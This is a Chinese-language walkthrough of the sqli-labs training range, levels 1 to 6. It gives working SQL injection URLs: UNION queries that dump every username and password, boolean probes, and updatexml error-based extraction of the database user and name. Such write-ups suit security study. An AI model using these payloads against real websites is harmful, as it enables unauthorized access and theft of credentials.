### 安装配置

网上资料很多，自行安装即可！

我这边 phpstudy 注册的靶场域名是 `sqli:10001`

<br>

### Less-1 基于单引号字符型注入

#### 前期探测

我们先为 id 传入一个 1，发现可以正常的获取数据  
`http://sqli:10001/Less-1/?id=1`

![](../imgs/target/sqli/s11.png)

但是传入 0 时发现什么都没有！证明该数据表 id 列的最小边界值为 1  
`http://sqli:10001/Less-1/?id=0`

<br>

union 联合查询有一个特性，就是前后列数不一致时会返回报错信息，我们可以根据该报错信息来调整查询列数直到正好碰上正确的列数！

这里为了方便我们直接去看原始数据库，发现 users 表内仅有 3 列，故 union 查询时也需要 3 列！

![](../imgs/target/sqli/s12.png)

<br>

#### union

查询当前数据库名称：

1. 由于 union 会拼接前后查询结果，故令前面的 id=0 使得查询不出结果，就只能显示后面的结果了
2. 注意两次查询的列数一致性！
3. database()是获取当前数据库名称的一个方法
4. --+不多说，注释掉后面的所有代码

`http://sqli:10001/Less-1/?id=0' union select 1,2,database() --+`

![](../imgs/target/sqli/s13.png)

<br>

查询 users 表下的所有用户名及其密码：

1. `group_concat(username)` 表示将 users 表中的列 username 下的所有数据压缩成一行来显示
2. `group_concat(password)` 作用同上
3. `from users` 注意我们要提取的表名称！

`http://sqli:10001/Less-1/?id=0' union select 1,group_concat(username),group_concat(password) from users --+`

![](../imgs/target/sqli/s14.png)

<br>

concat_ws 的使用  
语法：concat_ws(spet,str1,str2)，spet 为分隔符，使用 16 进制表示，str1 和 str2 就是相互连接的两个字符串

`http://sqli:10001/Less-1/?id=0' union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 --+`

<br>

### Less-2 基于错误的整型注入

即 `id=1 and 1=1 --+`

<br>

### Less-3 基于错误的单引号变形字符型注入

即 `id=1') and 1=1 --+`

<br>

### Less-4 基于错误的双引号变形字符型注入

即 `id=1") and 1=1 --+`

<br>

### Less-5 基于单引号字符型的错误回显注入

> 基于 updatexml 函数的解释，请看我的另一篇文章 QWQ

通关密钥：`id=1' union select updatexml(666,concat('~',(select user())),'good luck') -- zhiyiyi`

<br>

### Less-6 基于双引号字符型的错误回显注入

通关密钥：`http://sqli:10001/Less-6/?id=1" union select updatexml(666,concat('~',(select database())),'good luck') -- zhiyiyi`

<br>
